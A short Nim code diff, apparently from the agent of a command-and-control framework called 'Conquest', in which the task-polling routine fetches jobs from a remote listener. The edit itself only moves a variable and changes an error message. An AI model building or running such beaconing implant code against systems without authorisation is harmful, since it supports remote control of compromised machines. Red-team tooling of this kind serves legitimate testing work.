@@ -35,15 +35,16 @@ proc register*(config: AgentConfig): string =
 proc getTasks*(config: AgentConfig, agent: string): seq[Task] = 
 
     let client = newAsyncHttpClient()
+    var responseBody = ""
 
     try:
         # Register agent to the Conquest server
-        let responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/tasks")
+        responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/tasks")
         return parseJson(responseBody).to(seq[Task])
 
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
-        echo "[-] [getTasks]:", err.msg
+        echo "[-] [getTasks]: ", responseBody
     finally:
         client.close()
 
